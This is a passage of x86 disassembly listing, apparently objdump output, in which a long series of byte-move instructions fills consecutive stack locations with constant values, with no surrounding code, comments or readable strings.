  404521:	c6 85 9c e7 ff ff c0 	mov    BYTE PTR [ebp-0x1864],0xc0
  404528:	c6 85 9d e7 ff ff e0 	mov    BYTE PTR [ebp-0x1863],0xe0
  40452f:	88 9d 9e e7 ff ff    	mov    BYTE PTR [ebp-0x1862],bl
  404535:	88 9d 9f e7 ff ff    	mov    BYTE PTR [ebp-0x1861],bl
  40453b:	88 9d a0 e7 ff ff    	mov    BYTE PTR [ebp-0x1860],bl
  404541:	88 9d a1 e7 ff ff    	mov    BYTE PTR [ebp-0x185f],bl
  404547:	88 9d a2 e7 ff ff    	mov    BYTE PTR [ebp-0x185e],bl
  40454d:	c6 85 a3 e7 ff ff 90 	mov    BYTE PTR [ebp-0x185d],0x90
  404554:	c6 85 a4 e7 ff ff 40 	mov    BYTE PTR [ebp-0x185c],0x40
  40455b:	c6 85 a5 e7 ff ff e0 	mov    BYTE PTR [ebp-0x185b],0xe0
  404562:	c6 85 a6 e7 ff ff c0 	mov    BYTE PTR [ebp-0x185a],0xc0
  404569:	c6 85 a7 e7 ff ff f0 	mov    BYTE PTR [ebp-0x1859],0xf0
  404570:	88 9d a8 e7 ff ff    	mov    BYTE PTR [ebp-0x1858],bl
  404576:	c6 85 a9 e7 ff ff e0 	mov    BYTE PTR [ebp-0x1857],0xe0
  40457d:	c6 85 aa e7 ff ff c0 	mov    BYTE PTR [ebp-0x1856],0xc0
  404584:	c6 85 ab e7 ff ff f0 	mov    BYTE PTR [ebp-0x1855],0xf0
  40458b:	c6 85 ac e7 ff ff 80 	mov    BYTE PTR [ebp-0x1854],0x80
  404592:	c6 85 ad e7 ff ff c0 	mov    BYTE PTR [ebp-0x1853],0xc0
  404599:	c6 85 ae e7 ff ff 20 	mov    BYTE PTR [ebp-0x1852],0x20
  4045a0:	c6 85 af e7 ff ff 10 	mov    BYTE PTR [ebp-0x1851],0x10
  4045a7:	88 9d b0 e7 ff ff    	mov    BYTE PTR [ebp-0x1850],bl
  4045ad:	c6 85 b1 e7 ff ff c0 	mov    BYTE PTR [ebp-0x184f],0xc0
  4045b4:	c6 85 b2 e7 ff ff 80 	mov    BYTE PTR [ebp-0x184e],0x80
  4045bb:	c6 85 b3 e7 ff ff 50 	mov    BYTE PTR [ebp-0x184d],0x50
  4045c2:	c6 85 b4 e7 ff ff 80 	mov    BYTE PTR [ebp-0x184c],0x80
  4045c9:	c6 85 b5 e7 ff ff b0 	mov    BYTE PTR [ebp-0x184b],0xb0
  4045d0:	88 9d b6 e7 ff ff    	mov    BYTE PTR [ebp-0x184a],bl
  4045d6:	88 9d b7 e7 ff ff    	mov    BYTE PTR [ebp-0x1849],bl
  4045dc:	c6 85 b8 e7 ff ff 80 	mov    BYTE PTR [ebp-0x1848],0x80
  4045e3:	c6 85 b9 e7 ff ff c0 	mov    BYTE PTR [ebp-0x1847],0xc0
  4045ea:	88 9d ba e7 ff ff    	mov    BYTE PTR [ebp-0x1846],bl
  4045f0:	c6 85 bb e7 ff ff 10 	mov    BYTE PTR [ebp-0x1845],0x10
  4045f7:	c6 85 bc e7 ff ff 80 	mov    BYTE PTR [ebp-0x1844],0x80
  4045fe:	c6 85 bd e7 ff ff 50 	mov    BYTE PTR [ebp-0x1843],0x50
  404605:	88 9d be e7 ff ff    	mov    BYTE PTR [ebp-0x1842],bl
  40460b:	c6 85 bf e7 ff ff 80 	mov    BYTE PTR [ebp-0x1841],0x80
  404612:	88 9d c0 e7 ff ff    	mov    BYTE PTR [ebp-0x1840],bl
  404618:	c6 85 c1 e7 ff ff d0 	mov    BYTE PTR [ebp-0x183f],0xd0
  40461f:	88 9d c2 e7 ff ff    	mov    BYTE PTR [ebp-0x183e],bl
  404625:	c6 85 c3 e7 ff ff 70 	mov    BYTE PTR [ebp-0x183d],0x70
  40462c:	c6 85 c4 e7 ff ff 40 	mov    BYTE PTR [ebp-0x183c],0x40
  404633:	c6 85 c5 e7 ff ff 20 	mov    BYTE PTR [ebp-0x183b],0x20
  40463a:	c6 85 c6 e7 ff ff e0 	mov    BYTE PTR [ebp-0x183a],0xe0
  404641:	c6 85 c7 e7 ff ff 60 	mov    BYTE PTR [ebp-0x1839],0x60
  404648:	c6 85 c8 e7 ff ff ae 	mov    BYTE PTR [ebp-0x1838],0xae
  40464f:	c6 85 c9 e7 ff ff b4 	mov    BYTE PTR [ebp-0x1837],0xb4
  404656:	c6 85 ca e7 ff ff 65 	mov    BYTE PTR [ebp-0x1836],0x65
  40465d:	c6 85 cb e7 ff ff 58 	mov    BYTE PTR [ebp-0x1835],0x58
  404664:	c6 85 cc e7 ff ff 34 	mov    BYTE PTR [ebp-0x1834],0x34
  40466b:	c6 85 cd e7 ff ff 40 	mov    BYTE PTR [ebp-0x1833],0x40
  404672:	c6 85 ce e7 ff ff 60 	mov    BYTE PTR [ebp-0x1832],0x60
  404679:	c6 85 cf e7 ff ff 20 	mov    BYTE PTR [ebp-0x1831],0x20
  404680:	c6 85 d0 e7 ff ff 4d 	mov    BYTE PTR [ebp-0x1830],0x4d
  404687:	c6 85 d1 e7 ff ff 69 	mov    BYTE PTR [ebp-0x182f],0x69
  40468e:	88 9d d2 e7 ff ff    	mov    BYTE PTR [ebp-0x182e],bl
  404694:	c6 85 d3 e7 ff ff 70 	mov    BYTE PTR [ebp-0x182d],0x70
  40469b:	c6 85 d4 e7 ff ff 80 	mov    BYTE PTR [ebp-0x182c],0x80
  4046a2:	c6 85 d5 e7 ff ff 20 	mov    BYTE PTR [ebp-0x182b],0x20
  4046a9:	c6 85 d6 e7 ff ff e0 	mov    BYTE PTR [ebp-0x182a],0xe0
  4046b0:	88 9d d7 e7 ff ff    	mov    BYTE PTR [ebp-0x1829],bl
  4046b6:	c6 85 d8 e7 ff ff 80 	mov    BYTE PTR [ebp-0x1828],0x80
  4046bd:	c6 85 d9 e7 ff ff 3a 	mov    BYTE PTR [ebp-0x1827],0x3a
  4046c4:	c6 85 da e7 ff ff 60 	mov    BYTE PTR [ebp-0x1826],0x60
  4046cb:	c6 85 db e7 ff ff a0 	mov    BYTE PTR [ebp-0x1825],0xa0
  4046d2:	88 9d dc e7 ff ff    	mov    BYTE PTR [ebp-0x1824],bl
  4046d8:	c6 85 dd e7 ff ff 14 	mov    BYTE PTR [ebp-0x1823],0x14
  4046df:	88 9d de e7 ff ff    	mov    BYTE PTR [ebp-0x1822],bl
  4046e5:	c6 85 df e7 ff ff f0 	mov    BYTE PTR [ebp-0x1821],0xf0
  4046ec:	88 9d e0 e7 ff ff    	mov    BYTE PTR [ebp-0x1820],bl
  4046f2:	c6 85 e1 e7 ff ff 30 	mov    BYTE PTR [ebp-0x181f],0x30
  4046f9:	88 9d e2 e7 ff ff    	mov    BYTE PTR [ebp-0x181e],bl
  4046ff:	c6 85 e3 e7 ff ff 90 	mov    BYTE PTR [ebp-0x181d],0x90
  404706:	88 9d e4 e7 ff ff    	mov    BYTE PTR [ebp-0x181c],bl
  40470c:	c6 85 e5 e7 ff ff 90 	mov    BYTE PTR [ebp-0x181b],0x90
  404713:	c6 85 e6 e7 ff ff a0 	mov    BYTE PTR [ebp-0x181a],0xa0
  40471a:	c6 85 e7 e7 ff ff 70 	mov    BYTE PTR [ebp-0x1819],0x70
  404721:	88 9d e8 e7 ff ff    	mov    BYTE PTR [ebp-0x1818],bl
  404727:	c6 85 e9 e7 ff ff b0 	mov    BYTE PTR [ebp-0x1817],0xb0
  40472e:	c6 85 ea e7 ff ff c0 	mov    BYTE PTR [ebp-0x1816],0xc0
  404735:	c6 85 eb e7 ff ff 30 	mov    BYTE PTR [ebp-0x1815],0x30
  40473c:	c6 85 ec e7 ff ff 20 	mov    BYTE PTR [ebp-0x1814],0x20
  404743:	c6 85 ed e7 ff ff b0 	mov    BYTE PTR [ebp-0x1813],0xb0
  40474a:	c6 85 ee e7 ff ff 80 	mov    BYTE PTR [ebp-0x1812],0x80
  404751:	c6 85 ef e7 ff ff b0 	mov    BYTE PTR [ebp-0x1811],0xb0
  404758:	c6 85 f0 e7 ff ff 2e 	mov    BYTE PTR [ebp-0x1810],0x2e
  40475f:	c6 85 f1 e7 ff ff 92 	mov    BYTE PTR [ebp-0x180f],0x92
  404766:	c6 85 f2 e7 ff ff e4 	mov    BYTE PTR [ebp-0x180e],0xe4
  40476d:	c6 85 f3 e7 ff ff 91 	mov    BYTE PTR [ebp-0x180d],0x91
  404774:	c6 85 f4 e7 ff ff b4 	mov    BYTE PTR [ebp-0x180c],0xb4
  40477b:	c6 85 f5 e7 ff ff d1 	mov    BYTE PTR [ebp-0x180b],0xd1
  404782:	c6 85 f6 e7 ff ff 40 	mov    BYTE PTR [ebp-0x180a],0x40
  404789:	c6 85 f7 e7 ff ff 30 	mov    BYTE PTR [ebp-0x1809],0x30
  404790:	c6 85 f8 e7 ff ff 2e 	mov    BYTE PTR [ebp-0x1808],0x2e
  404797:	c6 85 f9 e7 ff ff a4 	mov    BYTE PTR [ebp-0x1807],0xa4
  40479e:	88 9d fa e7 ff ff    	mov    BYTE PTR [ebp-0x1806],bl
  4047a4:	c6 85 fb e7 ff ff f0 	mov    BYTE PTR [ebp-0x1805],0xf0
  4047ab:	c6 85 fc e7 ff ff 40 	mov    BYTE PTR [ebp-0x1804],0x40
  4047b2:	c6 85 fd e7 ff ff f0 	mov    BYTE PTR [ebp-0x1803],0xf0
  4047b9:	c6 85 fe e7 ff ff a0 	mov    BYTE PTR [ebp-0x1802],0xa0
  4047c0:	c6 85 ff e7 ff ff f0 	mov    BYTE PTR [ebp-0x1801],0xf0
  4047c7:	88 9d 00 e8 ff ff    	mov    BYTE PTR [ebp-0x1800],bl
  4047cd:	c6 85 01 e8 ff ff 06 	mov    BYTE PTR [ebp-0x17ff],0x6
  4047d4:	c6 85 02 e8 ff ff a0 	mov    BYTE PTR [ebp-0x17fe],0xa0
  4047db:	c6 85 03 e8 ff ff 50 	mov    BYTE PTR [ebp-0x17fd],0x50
  4047e2:	88 9d 04 e8 ff ff    	mov    BYTE PTR [ebp-0x17fc],bl
  4047e8:	c6 85 05 e8 ff ff 8e 	mov    BYTE PTR [ebp-0x17fb],0x8e
  4047ef:	c6 85 06 e8 ff ff 60 	mov    BYTE PTR [ebp-0x17fa],0x60
  4047f6:	c6 85 07 e8 ff ff c0 	mov    BYTE PTR [ebp-0x17f9],0xc0
  4047fd:	c6 85 08 e8 ff ff 80 	mov    BYTE PTR [ebp-0x17f8],0x80
  404804:	c6 85 09 e8 ff ff 40 	mov    BYTE PTR [ebp-0x17f7],0x40
  40480b:	c6 85 0a e8 ff ff 80 	mov    BYTE PTR [ebp-0x17f6],0x80
  404812:	c6 85 0b e8 ff ff 20 	mov    BYTE PTR [ebp-0x17f5],0x20
  404819:	c6 85 0c e8 ff ff 80 	mov    BYTE PTR [ebp-0x17f4],0x80
  404820:	c6 85 0d e8 ff ff d0 	mov    BYTE PTR [ebp-0x17f3],0xd0
  404827:	c6 85 0e e8 ff ff 20 	mov    BYTE PTR [ebp-0x17f2],0x20
  40482e:	c6 85 0f e8 ff ff e0 	mov    BYTE PTR [ebp-0x17f1],0xe0
  404835:	88 9d 10 e8 ff ff    	mov    BYTE PTR [ebp-0x17f0],bl
  40483b:	c6 85 11 e8 ff ff e0 	mov    BYTE PTR [ebp-0x17ef],0xe0
  404842:	c6 85 12 e8 ff ff e0 	mov    BYTE PTR [ebp-0x17ee],0xe0
  404849:	c6 85 13 e8 ff ff 10 	mov    BYTE PTR [ebp-0x17ed],0x10
  404850:	c6 85 14 e8 ff ff 40 	mov    BYTE PTR [ebp-0x17ec],0x40
  404857:	c6 85 15 e8 ff ff f0 	mov    BYTE PTR [ebp-0x17eb],0xf0
  40485e:	c6 85 16 e8 ff ff a0 	mov    BYTE PTR [ebp-0x17ea],0xa0
  404865:	c6 85 17 e8 ff ff c0 	mov    BYTE PTR [ebp-0x17e9],0xc0
  40486c:	c6 85 18 e8 ff ff ae 	mov    BYTE PTR [ebp-0x17e8],0xae
  404873:	c6 85 19 e8 ff ff d4 	mov    BYTE PTR [ebp-0x17e7],0xd4
  40487a:	c6 85 1a e8 ff ff 61 	mov    BYTE PTR [ebp-0x17e6],0x61
  404881:	c6 85 1b e8 ff ff e4 	mov    BYTE PTR [ebp-0x17e5],0xe4
  404888:	c6 85 1c e8 ff ff e1 	mov    BYTE PTR [ebp-0x17e4],0xe1
  40488f:	c6 85 1d e8 ff ff 30 	mov    BYTE PTR [ebp-0x17e3],0x30
  404896:	c6 85 1e e8 ff ff 40 	mov    BYTE PTR [ebp-0x17e2],0x40
  40489d:	c6 85 1f e8 ff ff b0 	mov    BYTE PTR [ebp-0x17e1],0xb0
  4048a4:	c6 85 20 e8 ff ff 3c 	mov    BYTE PTR [ebp-0x17e0],0x3c
  4048ab:	c6 85 21 e8 ff ff d0 	mov    BYTE PTR [ebp-0x17df],0xd0
  4048b2:	c6 85 22 e8 ff ff a0 	mov    BYTE PTR [ebp-0x17de],0xa0
  4048b9:	c6 85 23 e8 ff ff d0 	mov    BYTE PTR [ebp-0x17dd],0xd0
  4048c0:	c6 85 24 e8 ff ff c0 	mov    BYTE PTR [ebp-0x17dc],0xc0
  4048c7:	c6 85 25 e8 ff ff c0 	mov    BYTE PTR [ebp-0x17db],0xc0
  4048ce:	c6 85 26 e8 ff ff a0 	mov    BYTE PTR [ebp-0x17da],0xa0
  4048d5:	c6 85 27 e8 ff ff 70 	mov    BYTE PTR [ebp-0x17d9],0x70
  4048dc:	88 9d 28 e8 ff ff    	mov    BYTE PTR [ebp-0x17d8],bl
  4048e2:	c6 85 29 e8 ff ff c2 	mov    BYTE PTR [ebp-0x17d7],0xc2
  4048e9:	c6 85 2a e8 ff ff c0 	mov    BYTE PTR [ebp-0x17d6],0xc0
  4048f0:	c6 85 2b e8 ff ff 70 	mov    BYTE PTR [ebp-0x17d5],0x70
  4048f7:	c6 85 2c e8 ff ff 80 	mov    BYTE PTR [ebp-0x17d4],0x80
  4048fe:	c6 85 2d e8 ff ff f4 	mov    BYTE PTR [ebp-0x17d3],0xf4
  404905:	c6 85 2e e8 ff ff 40 	mov    BYTE PTR [ebp-0x17d2],0x40
  40490c:	c6 85 2f e8 ff ff 20 	mov    BYTE PTR [ebp-0x17d1],0x20
  404913:	88 9d 30 e8 ff ff    	mov    BYTE PTR [ebp-0x17d0],bl
  404919:	c6 85 31 e8 ff ff 60 	mov    BYTE PTR [ebp-0x17cf],0x60
  404920:	c6 85 32 e8 ff ff a0 	mov    BYTE PTR [ebp-0x17ce],0xa0
  404927:	c6 85 33 e8 ff ff 70 	mov    BYTE PTR [ebp-0x17cd],0x70
  40492e:	88 9d 34 e8 ff ff    	mov    BYTE PTR [ebp-0x17cc],bl
  404934:	c6 85 35 e8 ff ff 10 	mov    BYTE PTR [ebp-0x17cb],0x10
  40493b:	c6 85 36 e8 ff ff e0 	mov    BYTE PTR [ebp-0x17ca],0xe0
  404942:	c6 85 37 e8 ff ff f0 	mov    BYTE PTR [ebp-0x17c9],0xf0
  404949:	88 9d 38 e8 ff ff    	mov    BYTE PTR [ebp-0x17c8],bl
  40494f:	c6 85 39 e8 ff ff 40 	mov    BYTE PTR [ebp-0x17c7],0x40
  404956:	c6 85 3a e8 ff ff c0 	mov    BYTE PTR [ebp-0x17c6],0xc0
  40495d:	c6 85 3b e8 ff ff 20 	mov    BYTE PTR [ebp-0x17c5],0x20
  404964:	c6 85 3c e8 ff ff 40 	mov    BYTE PTR [ebp-0x17c4],0x40
  40496b:	c6 85 3d e8 ff ff c0 	mov    BYTE PTR [ebp-0x17c3],0xc0
  404972:	c6 85 3e e8 ff ff a0 	mov    BYTE PTR [ebp-0x17c2],0xa0
  404979:	c6 85 3f e8 ff ff c0 	mov    BYTE PTR [ebp-0x17c1],0xc0
  404980:	c6 85 40 e8 ff ff 2e 	mov    BYTE PTR [ebp-0x17c0],0x2e
  404987:	c6 85 41 e8 ff ff 72 	mov    BYTE PTR [ebp-0x17bf],0x72
  40498e:	c6 85 42 e8 ff ff 13 	mov    BYTE PTR [ebp-0x17be],0x13
  404995:	c6 85 43 e8 ff ff 92 	mov    BYTE PTR [ebp-0x17bd],0x92
  40499c:	c6 85 44 e8 ff ff e3 	mov    BYTE PTR [ebp-0x17bc],0xe3
  4049a3:	88 9d 45 e8 ff ff    	mov    BYTE PTR [ebp-0x17bb],bl
  4049a9:	c6 85 46 e8 ff ff e0 	mov    BYTE PTR [ebp-0x17ba],0xe0
  4049b0:	c6 85 47 e8 ff ff c0 	mov    BYTE PTR [ebp-0x17b9],0xc0
  4049b7:	c6 85 48 e8 ff ff b4 	mov    BYTE PTR [ebp-0x17b8],0xb4
  4049be:	c6 85 49 e8 ff ff 31 	mov    BYTE PTR [ebp-0x17b7],0x31
  4049c5:	88 9d 4a e8 ff ff    	mov    BYTE PTR [ebp-0x17b6],bl
  4049cb:	c6 85 4b e8 ff ff d0 	mov    BYTE PTR [ebp-0x17b5],0xd0
  4049d2:	88 9d 4c e8 ff ff    	mov    BYTE PTR [ebp-0x17b4],bl
  4049d8:	88 9d 4d e8 ff ff    	mov    BYTE PTR [ebp-0x17b3],bl
  4049de:	c6 85 4e e8 ff ff 80 	mov    BYTE PTR [ebp-0x17b2],0x80
  4049e5:	c6 85 4f e8 ff ff f0 	mov    BYTE PTR [ebp-0x17b1],0xf0
  4049ec:	88 9d 50 e8 ff ff    	mov    BYTE PTR [ebp-0x17b0],bl
  4049f2:	c6 85 51 e8 ff ff 22 	mov    BYTE PTR [ebp-0x17af],0x22
  4049f9:	c6 85 52 e8 ff ff 60 	mov    BYTE PTR [ebp-0x17ae],0x60
  404a00:	c6 85 53 e8 ff ff f0 	mov    BYTE PTR [ebp-0x17ad],0xf0
  404a07:	c6 85 54 e8 ff ff 40 	mov    BYTE PTR [ebp-0x17ac],0x40
  404a0e:	c6 85 55 e8 ff ff 06 	mov    BYTE PTR [ebp-0x17ab],0x6
  404a15:	c6 85 56 e8 ff ff 60 	mov    BYTE PTR [ebp-0x17aa],0x60
  404a1c:	c6 85 57 e8 ff ff 80 	mov    BYTE PTR [ebp-0x17a9],0x80
  404a23:	88 9d 58 e8 ff ff    	mov    BYTE PTR [ebp-0x17a8],bl
  404a29:	c6 85 59 e8 ff ff d0 	mov    BYTE PTR [ebp-0x17a7],0xd0
  404a30:	c6 85 5a e8 ff ff e0 	mov    BYTE PTR [ebp-0x17a6],0xe0
  404a37:	c6 85 5b e8 ff ff 90 	mov    BYTE PTR [ebp-0x17a5],0x90
  404a3e:	88 9d 5c e8 ff ff    	mov    BYTE PTR [ebp-0x17a4],bl
  404a44:	c6 85 5d e8 ff ff f0 	mov    BYTE PTR [ebp-0x17a3],0xf0
  404a4b:	c6 85 5e e8 ff ff 20 	mov    BYTE PTR [ebp-0x17a2],0x20
  404a52:	c6 85 5f e8 ff ff b0 	mov    BYTE PTR [ebp-0x17a1],0xb0
  404a59:	88 9d 60 e8 ff ff    	mov    BYTE PTR [ebp-0x17a0],bl
  404a5f:	c6 85 61 e8 ff ff b0 	mov    BYTE PTR [ebp-0x179f],0xb0
  404a66:	88 9d 62 e8 ff ff    	mov    BYTE PTR [ebp-0x179e],bl
  404a6c:	c6 85 63 e8 ff ff 90 	mov    BYTE PTR [ebp-0x179d],0x90
  404a73:	c6 85 64 e8 ff ff 80 	mov    BYTE PTR [ebp-0x179c],0x80
  404a7a:	c6 85 65 e8 ff ff f0 	mov    BYTE PTR [ebp-0x179b],0xf0
  404a81:	88 9d 66 e8 ff ff    	mov    BYTE PTR [ebp-0x179a],bl
  404a87:	c6 85 67 e8 ff ff f0 	mov    BYTE PTR [ebp-0x1799],0xf0
  404a8e:	c6 85 68 e8 ff ff ae 	mov    BYTE PTR [ebp-0x1798],0xae
  404a95:	c6 85 69 e8 ff ff 72 	mov    BYTE PTR [ebp-0x1797],0x72
  404a9c:	c6 85 6a e8 ff ff 85 	mov    BYTE PTR [ebp-0x1796],0x85
  404aa3:	c6 85 6b e8 ff ff 5c 	mov    BYTE PTR [ebp-0x1795],0x5c
  404aaa:	c6 85 6c e8 ff ff ef 	mov    BYTE PTR [ebp-0x1794],0xef
  404ab1:	c6 85 6d e8 ff ff 23 	mov    BYTE PTR [ebp-0x1793],0x23
  404ab8:	c6 85 6e e8 ff ff 60 	mov    BYTE PTR [ebp-0x1792],0x60
  404abf:	88 9d 6f e8 ff ff    	mov    BYTE PTR [ebp-0x1791],bl
  404ac5:	c6 85 70 e8 ff ff 32 	mov    BYTE PTR [ebp-0x1790],0x32
  404acc:	c6 85 71 e8 ff ff 01 	mov    BYTE PTR [ebp-0x178f],0x1
  404ad3:	c6 85 72 e8 ff ff 80 	mov    BYTE PTR [ebp-0x178e],0x80
  404ada:	c6 85 73 e8 ff ff 40 	mov    BYTE PTR [ebp-0x178d],0x40
  404ae1:	88 9d 74 e8 ff ff    	mov    BYTE PTR [ebp-0x178c],bl
  404ae7:	c6 85 75 e8 ff ff 30 	mov    BYTE PTR [ebp-0x178b],0x30
  404aee:	c6 85 76 e8 ff ff 60 	mov    BYTE PTR [ebp-0x178a],0x60
  404af5:	c6 85 77 e8 ff ff 70 	mov    BYTE PTR [ebp-0x1789],0x70
  404afc:	c6 85 78 e8 ff ff 80 	mov    BYTE PTR [ebp-0x1788],0x80
  404b03:	c6 85 79 e8 ff ff c2 	mov    BYTE PTR [ebp-0x1787],0xc2
  404b0a:	c6 85 7a e8 ff ff a0 	mov    BYTE PTR [ebp-0x1786],0xa0
  404b11:	c6 85 7b e8 ff ff 10 	mov    BYTE PTR [ebp-0x1785],0x10
  404b18:	88 9d 7c e8 ff ff    	mov    BYTE PTR [ebp-0x1784],bl
  404b1e:	c6 85 7d e8 ff ff b8 	mov    BYTE PTR [ebp-0x1783],0xb8
  404b25:	88 9d 7e e8 ff ff    	mov    BYTE PTR [ebp-0x1782],bl
  404b2b:	c6 85 7f e8 ff ff 50 	mov    BYTE PTR [ebp-0x1781],0x50
  404b32:	88 9d 80 e8 ff ff    	mov    BYTE PTR [ebp-0x1780],bl
  404b38:	88 9d 81 e8 ff ff    	mov    BYTE PTR [ebp-0x177f],bl
  404b3e:	88 9d 82 e8 ff ff    	mov    BYTE PTR [ebp-0x177e],bl
  404b44:	c6 85 83 e8 ff ff f0 	mov    BYTE PTR [ebp-0x177d],0xf0
  404b4b:	88 9d 84 e8 ff ff    	mov    BYTE PTR [ebp-0x177c],bl
  404b51:	c6 85 85 e8 ff ff 60 	mov    BYTE PTR [ebp-0x177b],0x60
  404b58:	c6 85 86 e8 ff ff 80 	mov    BYTE PTR [ebp-0x177a],0x80
  404b5f:	c6 85 87 e8 ff ff 70 	mov    BYTE PTR [ebp-0x1779],0x70
  404b66:	88 9d 88 e8 ff ff    	mov    BYTE PTR [ebp-0x1778],bl
  404b6c:	c6 85 89 e8 ff ff f0 	mov    BYTE PTR [ebp-0x1777],0xf0
  404b73:	c6 85 8a e8 ff ff a0 	mov    BYTE PTR [ebp-0x1776],0xa0
  404b7a:	c6 85 8b e8 ff ff 70 	mov    BYTE PTR [ebp-0x1775],0x70
  404b81:	88 9d 8c e8 ff ff    	mov    BYTE PTR [ebp-0x1774],bl
  404b87:	c6 85 8d e8 ff ff 20 	mov    BYTE PTR [ebp-0x1773],0x20
  404b8e:	c6 85 8e e8 ff ff 80 	mov    BYTE PTR [ebp-0x1772],0x80
  404b95:	c6 85 8f e8 ff ff b2 	mov    BYTE PTR [ebp-0x1771],0xb2
  404b9c:	88 9d 90 e8 ff ff    	mov    BYTE PTR [ebp-0x1770],bl
  404ba2:	c6 85 91 e8 ff ff 80 	mov    BYTE PTR [ebp-0x176f],0x80
  404ba9:	c6 85 92 e8 ff ff 80 	mov    BYTE PTR [ebp-0x176e],0x80
  404bb0:	c6 85 93 e8 ff ff 20 	mov    BYTE PTR [ebp-0x176d],0x20
  404bb7:	c6 85 94 e8 ff ff 40 	mov    BYTE PTR [ebp-0x176c],0x40
  404bbe:	c6 85 95 e8 ff ff f0 	mov    BYTE PTR [ebp-0x176b],0xf0
  404bc5:	c6 85 96 e8 ff ff 20 	mov    BYTE PTR [ebp-0x176a],0x20
  404bcc:	88 9d 97 e8 ff ff    	mov    BYTE PTR [ebp-0x1769],bl
  404bd2:	88 9d 98 e8 ff ff    	mov    BYTE PTR [ebp-0x1768],bl
  404bd8:	88 9d 99 e8 ff ff    	mov    BYTE PTR [ebp-0x1767],bl
  404bde:	c6 85 9a e8 ff ff a0 	mov    BYTE PTR [ebp-0x1766],0xa0
  404be5:	c6 85 9b e8 ff ff 90 	mov    BYTE PTR [ebp-0x1765],0x90
  404bec:	88 9d 9c e8 ff ff    	mov    BYTE PTR [ebp-0x1764],bl
  404bf2:	c6 85 9d e8 ff ff 50 	mov    BYTE PTR [ebp-0x1763],0x50
  404bf9:	c6 85 9e e8 ff ff 40 	mov    BYTE PTR [ebp-0x1762],0x40
  404c00:	c6 85 9f e8 ff ff 50 	mov    BYTE PTR [ebp-0x1761],0x50
  404c07:	88 9d a0 e8 ff ff    	mov    BYTE PTR [ebp-0x1760],bl
  404c0d:	c6 85 a1 e8 ff ff 50 	mov    BYTE PTR [ebp-0x175f],0x50
  404c14:	c6 85 a2 e8 ff ff c0 	mov    BYTE PTR [ebp-0x175e],0xc0
  404c1b:	c6 85 a3 e8 ff ff 60 	mov    BYTE PTR [ebp-0x175d],0x60
  404c22:	c6 85 a4 e8 ff ff 40 	mov    BYTE PTR [ebp-0x175c],0x40
  404c29:	88 9d a5 e8 ff ff    	mov    BYTE PTR [ebp-0x175b],bl
  404c2f:	c6 85 a6 e8 ff ff 60 	mov    BYTE PTR [ebp-0x175a],0x60
  404c36:	c6 85 a7 e8 ff ff a0 	mov    BYTE PTR [ebp-0x1759],0xa0
  404c3d:	c6 85 a8 e8 ff ff 80 	mov    BYTE PTR [ebp-0x1758],0x80
  404c44:	c6 85 a9 e8 ff ff 20 	mov    BYTE PTR [ebp-0x1757],0x20
  404c4b:	88 9d aa e8 ff ff    	mov    BYTE PTR [ebp-0x1756],bl
  404c51:	c6 85 ab e8 ff ff e0 	mov    BYTE PTR [ebp-0x1755],0xe0
  404c58:	c6 85 ac e8 ff ff c0 	mov    BYTE PTR [ebp-0x1754],0xc0
  404c5f:	c6 85 ad e8 ff ff f0 	mov    BYTE PTR [ebp-0x1753],0xf0
  404c66:	c6 85 ae e8 ff ff 20 	mov    BYTE PTR [ebp-0x1752],0x20
  404c6d:	c6 85 af e8 ff ff c0 	mov    BYTE PTR [ebp-0x1751],0xc0
  404c74:	88 9d b0 e8 ff ff    	mov    BYTE PTR [ebp-0x1750],bl
  404c7a:	c6 85 b1 e8 ff ff 50 	mov    BYTE PTR [ebp-0x174f],0x50
  404c81:	c6 85 b2 e8 ff ff e0 	mov    BYTE PTR [ebp-0x174e],0xe0
  404c88:	88 9d b3 e8 ff ff    	mov    BYTE PTR [ebp-0x174d],bl
  404c8e:	c6 85 b4 e8 ff ff 40 	mov    BYTE PTR [ebp-0x174c],0x40
  404c95:	c6 85 b5 e8 ff ff f0 	mov    BYTE PTR [ebp-0x174b],0xf0
  404c9c:	c6 85 b6 e8 ff ff e0 	mov    BYTE PTR [ebp-0x174a],0xe0
  404ca3:	c6 85 b7 e8 ff ff 60 	mov    BYTE PTR [ebp-0x1749],0x60
  404caa:	c6 85 b8 e8 ff ff 80 	mov    BYTE PTR [ebp-0x1748],0x80
  404cb1:	c6 85 b9 e8 ff ff f0 	mov    BYTE PTR [ebp-0x1747],0xf0
  404cb8:	c6 85 ba e8 ff ff c0 	mov    BYTE PTR [ebp-0x1746],0xc0
  404cbf:	c6 85 bb e8 ff ff 10 	mov    BYTE PTR [ebp-0x1745],0x10
  404cc6:	c6 85 bc e8 ff ff 40 	mov    BYTE PTR [ebp-0x1744],0x40
  404ccd:	c6 85 bd e8 ff ff e0 	mov    BYTE PTR [ebp-0x1743],0xe0
  404cd4:	c6 85 be e8 ff ff 80 	mov    BYTE PTR [ebp-0x1742],0x80
  404cdb:	88 9d bf e8 ff ff    	mov    BYTE PTR [ebp-0x1741],bl
  404ce1:	88 9d c0 e8 ff ff    	mov    BYTE PTR [ebp-0x1740],bl
  404ce7:	c6 85 c1 e8 ff ff 80 	mov    BYTE PTR [ebp-0x173f],0x80
  404cee:	88 9d c2 e8 ff ff    	mov    BYTE PTR [ebp-0x173e],bl
  404cf4:	c6 85 c3 e8 ff ff 70 	mov    BYTE PTR [ebp-0x173d],0x70
  404cfb:	c6 85 c4 e8 ff ff c0 	mov    BYTE PTR [ebp-0x173c],0xc0
  404d02:	c6 85 c5 e8 ff ff e0 	mov    BYTE PTR [ebp-0x173b],0xe0
  404d09:	c6 85 c6 e8 ff ff 60 	mov    BYTE PTR [ebp-0x173a],0x60
  404d10:	c6 85 c7 e8 ff ff 20 	mov    BYTE PTR [ebp-0x1739],0x20
  404d17:	88 9d c8 e8 ff ff    	mov    BYTE PTR [ebp-0x1738],bl
  404d1d:	c6 85 c9 e8 ff ff 40 	mov    BYTE PTR [ebp-0x1737],0x40
  404d24:	c6 85 ca e8 ff ff a0 	mov    BYTE PTR [ebp-0x1736],0xa0
  404d2b:	c6 85 cb e8 ff ff 50 	mov    BYTE PTR [ebp-0x1735],0x50
  404d32:	c6 85 cc e8 ff ff c0 	mov    BYTE PTR [ebp-0x1734],0xc0
  404d39:	c6 85 cd e8 ff ff 30 	mov    BYTE PTR [ebp-0x1733],0x30
  404d40:	c6 85 ce e8 ff ff e0 	mov    BYTE PTR [ebp-0x1732],0xe0
  404d47:	88 9d cf e8 ff ff    	mov    BYTE PTR [ebp-0x1731],bl
  404d4d:	88 9d d0 e8 ff ff    	mov    BYTE PTR [ebp-0x1730],bl
